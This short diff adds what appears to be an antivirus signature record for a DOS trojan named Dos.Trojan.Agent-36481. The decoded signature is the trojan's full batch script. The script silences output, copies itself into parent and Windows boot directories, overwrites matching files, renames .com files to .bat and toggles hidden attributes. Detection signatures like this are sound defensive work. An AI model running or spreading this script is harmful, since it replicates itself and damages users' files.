@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36481
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off :echooff ctty nul copy %0 .. copy %0 %winbootdir%\%0 set boo= *.kk if not exist %boo% goto echoon for %%b in (%boo% ..\%boo% c:\%boo%) do copy %%b _%boo% for %%o in (%boo% ..\%boo% c:\%boo%) do copy %0 %%o ren *?.c?m *.bat attrib *%boo% + h attrib %0 -h goto echooff :echoon _%0.com 
